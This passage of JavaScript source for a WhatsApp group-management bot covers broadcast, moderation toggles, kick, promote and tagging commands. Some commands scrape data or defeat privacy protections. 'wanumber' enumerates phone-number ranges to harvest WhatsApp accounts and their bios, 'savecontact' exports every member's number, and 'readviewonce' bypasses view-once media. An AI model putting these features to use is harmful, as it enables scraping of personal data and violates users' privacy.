                if (!text) return replygcdeepak(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                let getGroups = await DeepakBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                replygcdeepak(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    DeepakBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://i.ibb.co/RjDcPYk/Zenitsu.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcdeepak(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!DeepakTheCreator) return DeepakStickOwner()
                try {
                   const getCase = (cases) => {
                      return "case" + `'${cases}'` + fs.readFileSync("Zenitsu7.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                   }
                   replygcdeepak(`${getCase(q)}`)
                } catch {
                  replygcdeepak(`case ${q} not found!`)
                }
            break
            //group
            case 'antibadword':
            case 'antitoxic':{
		         if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].badword = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].badword = false
                  replygcdeepak(`${commad} is disabled`)
               }
               }
            break
            case 'react': {
                if (!DeepakTheCreator) return DeepakStickOwner()
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                DeepakBotInc.sendMessage(m.chat, reactionMessage)
            }
            break
           case 'nsfw': {
if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
if (args[0] === "on") {
if (AntiNsfw) return replygcdeepak('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
replygcdeepak('Success in turning on nsfw in this group')
var groupe = await DeepakBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
DeepakBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replygcdeepak('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
replygcdeepak('Success in turning off nsfw in this group')
} else {
  await replygcdeepak(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
  case 'userjid':
  case 'jid':
  case 'groupjid':
            case 'id':{
            replygcdeepak(from)
           }
          break
            case 'antiaudio':{
            	if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiaudio = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiaudio = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'antiforeign':{
            	if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[m.chat].antiforeignnum = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[m.chat].antiforeignnum = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'poll': {
	if (!DeepakTheCreator) return DeepakStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygcdeepak(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Deepak,Zenitsu...`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await DeepakBotInc.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
            case 'antipoll':{
            	if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antipoll = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antipoll = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'antisticker':{
            	if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antisticker = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antisticker = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'antiimage':{
            	if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiimage = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiimage = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'antivideo':{
            	if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antivideo = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivideo = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'antivirtex':{
		         if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antivirtex = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivirtex = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'antibot':{
		         if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antibot = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antibot = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'readviewonce': {
	if (!m.quoted) return replygcdeepak(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcdeepak(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return DeepakBotInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return DeepakBotInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
            case 'antiviewonce':{
		         if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antiviewonce = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiviewonce = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'antispam':{
		         if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antispam = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antispam = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'antimedia':{
		         if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antimedia = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antimedia = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'antidocument':{
		         if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antidocument = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antidocument = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'anticontact':{
		         if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].anticontact = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].anticontact = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'antilocation':{
		         if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilocation = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilocation = false
                  replygcdeepak(`${command} is disabled`)
               }
               }
            break
            case 'antilink': {
               if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilink = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilink = false
                  replygcdeepak(`${command} is disabled`)
               }
            }
            break
            case 'antilinkgc': {
               if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  replygcdeepak(`${command} is disabled`)
               }
            }
            break
            case 'antipromotion': {
               if (!m.isGroup) return DeepakStickGroup()
if (!isBotAdmins) return DeepakStickBotAdmin()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antipromotion = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antipromotion = false
                  replygcdeepak(`${command} is disabled`)
               }
            }
            break
            case 'welcome':
            case 'left': {
               if (!m.isGroup) return DeepakStickGroup()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  welcome = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  welcome = false
                  replygcdeepak(`${command} is disabled`)
               }
            }
            break
            case 'adminevent': {
               if (!m.isGroup) return DeepakStickGroup()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  adminevent = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  adminevent = false
                  replygcdeepak(`${command} is disabled`)
               }
            }
            break
case 'groupevent': {
               if (!m.isGroup) return DeepakStickGroup()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
               if (args.length < 1) return replygcdeepak('on/off?')
               if (args[0] === 'on') {
                  groupevent = true
                  replygcdeepak(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  groupevent = false
                  replygcdeepak(`${command} is disabled`)
               }
            }
            break 
            case 'invite': {
	if (!m.isGroup) return DeepakStickGroup()
	if (!isBotAdmins) return DeepakStickBotAdmin()
if (!text) return replygcdeepak(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 918348225320`)
if (text.includes('+')) return replygcdeepak(`Enter the number together without *+*`)
if (isNaN(text)) return replygcdeepak(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await DeepakBotInc.groupInviteCode(group)
      await DeepakBotInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replygcdeepak(` An invite link is sent to the user`) 
}
break
            case 'closetime':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcdeepak('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
                }
                replygcdeepak(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Close time* group closed by admin\nnow only admin can send messages`
                    DeepakBotInc.groupSettingUpdate(m.chat, 'announcement')
                    replygcdeepak(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins && !DeepakTheCreator) return replygcdeepak(mess.admin)
                if (!isBotAdmins) return DeepakStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcdeepak('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                replygcdeepak(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Open time* the group was opened by admin\n now members can send messages`
                    DeepakBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcdeepak(open)
                }, timer)
                break
            case 'kick':
                if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await DeepakBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
                replygcdeepak(mess.done)
                break

                case "idgroup": case "groupid": {
if (!DeepakTheCreator) return DeepakStickOwner()
let getGroups = await DeepakBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await DeepakBotInc.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
replygcdeepak(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
}
break
case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
           	if (!text) return replygcdeepak(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        replygcdeepak(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            var anu = await DeepakBotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await DeepakBotInc.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        replygcdeepak(`${text66}${nobio}${nowhatsapp}`)
        }
break
case 'getcontact': case 'getcon': {
if (!m.isGroup) return DeepakStickGroup()
if (!(isGroupAdmins || DeepakTheCreator)) return DeepakStickAdmin()
deepakbigpp = await DeepakBotInc.sendMessage(m.chat, {
    text: `\nGroup: *${groupMetadata.subject}*\nMember: *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000)
DeepakBotInc.sendContact(m.chat, participants.map(a => a.id), deepakbigpp)
}
break
case 'savecontact': case 'svcontact':{
if (!m.isGroup) return DeepakStickGroup()
if (!(isGroupAdmins || DeepakTheCreator)) return DeepakStickAdmin()
let cmiggc = await DeepakBotInc.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
}
let nmfilect = './contacts.vcf'
replygcdeepak('\nBe patient bro, saving... '+cmiggc.participants.length+' contact')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
DeepakBotInc.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSucceed\nGroup: *'+cmiggc.subject+'*\nContact: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
}
break
case 'sendcontact': case 'sencontact': {
if (!m.isGroup) return DeepakStickGroup()
if (!m.mentionedJid[0]) return replygcdeepak('\nUse like this\n Example:.sendcontact @tag|name')
let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
DeepakBotInc.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
}
break
case 'contacttag': case 'contag':{
if (!m.isGroup) return DeepakStickGroup()
if (!(isGroupAdmins || DeepakTheCreator)) return DeepakStickAdmin()
if (!m.mentionedJid[0]) return replygcdeepak('\nUse like this\n Example:.contacttag @tag|name')
let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Mobile\nEND:VCARD"}]
}
DeepakBotInc.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
}
break
            case 'add':
                if (!m.isGroup) return DeepakStickGroup()
                if(!DeepakTheCreator) return DeepakStickOwner()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                let blockwwww = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await DeepakBotInc.groupParticipantsUpdate(m.chat, [blockwwww], 'add')
                replygcdeepak(mess.done)
                break
            case 'promote':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await DeepakBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
                replygcdeepak(mess.done)
                break
            case 'demote':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await DeepakBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
                replygcdeepak(mess.done)
                break
            case 'setnamegc':
            case 'setsubject':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                if (!text) return replygcdeepak('Text ?')
                await DeepakBotInc.groupUpdateSubject(m.chat, text)
                replygcdeepak(mess.done)
                break
                case 'userjid':{
          	if(!DeepakTheCreator) return DeepakStickOwner()
        const groupMetadata = m.isGroup ? await DeepakBotInc.groupMetadata(m.chat).catch((e) => {}) : ""
		const participants = m.isGroup ? await groupMetadata.participants : ""
    let textt = `_Here is jid address of all users of_\n *- ${groupMetadata.subject}*\n\n`
    for (let mem of participants) {
            textt += `${themeemoji} ${mem.id}\n`
        }
      replygcdeepak(textt)
    }
    break
    case 'creategc': case 'creategroup': {
if (!DeepakTheCreator) return DeepakStickOwner()
if (!args.join(" ")) return replygcdeepak(`Use ${prefix+command} groupname`)
try {
let cret = await DeepakBotInc.groupCreate(args.join(" "), [])
let response = await DeepakBotInc.groupInviteCode(cret.id)
const teksop = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`
DeepakBotInc.sendMessage(m.chat, { text:teksop, mentions: await DeepakBotInc.parseMention(teksop)}, {quoted:m})
} catch {
	replygcdeepak(`Error`)
	}
}
break
    case 'setbotbio':{
if (!DeepakTheCreator) return DeepakStickOwner()
if (!text) return replygcdeepak(`Where is the text?\nExample: ${prefix + command} Cheems Bot`)
    await DeepakBotInc.updateProfileStatus(text)
    replygcdeepak(`Success in changing the bio of bot's number`)
    }
    break
    case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return DeepakStickGroup()
if (!isAdmins && !DeepakTheCreator) return DeepakStickAdmin()
if (!isBotAdmins) return DeepakStickBotAdmin()
    await DeepakBotInc.removeProfilePicture(from)
    }
    break
    case 'deleteppbot': case 'delppbot': {
if (!DeepakTheCreator) return DeepakStickOwner()
    await DeepakBotInc.removeProfilePicture(DeepakBotInc.user.id)
    replygcdeepak(`Success in deleting bot's profile picture`)
    }
    break
            case 'setdesc':
            case 'setdesk':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                if (!text) return replygcdeepak('Text ?')
                await DeepakBotInc.groupUpdateDescription(m.chat, text)
                replygcdeepak(mess.done)
                break
            case 'setppgroup':
            case 'setppgrup':
            case 'setppgc':
            case 'setgrouppp':
            case 'setgruppp':
            case 'setgcpp':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins) return replygcdeepak(mess.admin)
                if (!isBotAdmins) return DeepakStickBotAdmin()
                if (!quoted) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
                if (!/image/.test(mime)) return replygcdeepak(`Send/Reply Image Caption Caption ${prefix + command}`)
                if (/webp/.test(mime)) return replygcdeepak(`Send/Reply Image With Caption ${prefix + command}`)
                var medis = await DeepakBotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                if (args[0] == 'full') {
                    var {
                        img
                    } = await generateProfilePicture(medis)
                    await DeepakBotInc.query({
                        tag: 'iq',
                        attrs: {
                            to: m.chat,
                            type: 'set',
                            xmlns: 'w:profile:picture'
                        },
                        content: [{
                            tag: 'picture',
                            attrs: {
                                type: 'image'
                            },
                            content: img
                        }]
                    })
                    fs.unlinkSync(medis)
                    replygcdeepak(mess.done)
                } else {
                    var memeg = await DeepakBotInc.updateProfilePicture(m.chat, {
                        url: medis
                    })
                    fs.unlinkSync(medis)
                    replygcdeepak(mess.done)
                }
                break
            case 'tagall':
            case 'tag':
                if (!m.isGroup) return DeepakStickGroup()
                if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
                if (!isBotAdmins) return DeepakStickBotAdmin()
                let me = m.sender
                let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
                for (let mem of participants) {
                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
                }
                DeepakBotInc.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'kickall': {
 if (!m.isGroup) return DeepakStickGroup()
 if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
 if (!isBotAdmins) return DeepakStickBotAdmin()
  const deepakkickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.welcome === true) {
 welcome = false;
  }
 for (let remove of deepakkickall) {
 await DeepakBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 replygcdeepak(`Success`);
}
break
case 'promoteall': {
 if (!m.isGroup) return DeepakStickGroup()
 if (!isAdmins && !isGroupOwner && !DeepakTheCreator) return DeepakStickAdmin()
 if (!isBotAdmins) return DeepakStickBotAdmin()
  const deepakpromoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
